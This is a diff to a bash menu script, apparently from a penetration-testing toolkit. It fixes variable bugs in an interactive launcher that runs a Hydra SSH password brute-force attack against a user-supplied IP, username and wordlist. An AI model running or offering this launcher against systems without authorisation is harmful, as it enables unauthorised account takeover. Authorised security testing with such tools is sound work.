@@ -36,24 +36,24 @@ menu(){
     printf "[*] You can setup ssh bruteforce here\n\n"
     
     username(){
-        read -p "[?] Username: " username
-        if [ -z $username ]; then printf "\n[!] Username cannot be empty! Try again...\n"; sleep 2; username; fi
+        read -p "[?] Username: " user
+        if [ -z $user ]; then printf "\n[!] Username cannot be empty! Try again...\n"; sleep 2; username; fi
     }
     
     ip_f(){
         read -p "[?] Target IP addres: " setip
-        if [ -z $setip ]; then printf "\n[!] IP cannot be empty! Try again...\n"; sleep 2; setip; fi
+        if [ -z $setip ]; then printf "\n[!] IP cannot be empty! Try again...\n"; sleep 2; ip_f; fi
     }
     
     wordlist(){
         read -p "[*] Use default wordlist? (Y/n): " def
         case $def in
             [yY][eE][sS]|[yY])
-                wordlist="/root/nh-scripts/default-ssh.txt"
+                wlst="/root/nh-scripts/default-ssh.txt"
                 ;;
             [nN][oO]|[nN])
                 printf "\n"
-                read -p "[?] Wordlist path: " wordlist
+                read -p "[?] Wordlist path: " wlst
                 ;;
             *)
                 printf "\n[!] Wrong answer! Try again...\n"; sleep 2; wordlist ;;
@@ -66,7 +66,7 @@ menu(){
         read -p "Start attack (Y/n): " startattack
         case $startattack in
             [yY][eE][sS]|[yY])
-                printf "\n\nTarget = $setip\nUsername = $username\nWordlist = $wordlist\n\nLaunching Hydra...\n\n"; sleep 2; hydra -l $username -P $wordlist $ip_f ssh ;;
+                printf "\n\nTarget = $setip\nUsername = $user\nWordlist = $wlst\n\nLaunching Hydra...\n\n"; sleep 2; hydra -l $user -P $wlst $setip ssh ;;
             [nN][oO]|[nN])
                 printf "\n\n"
                 exit
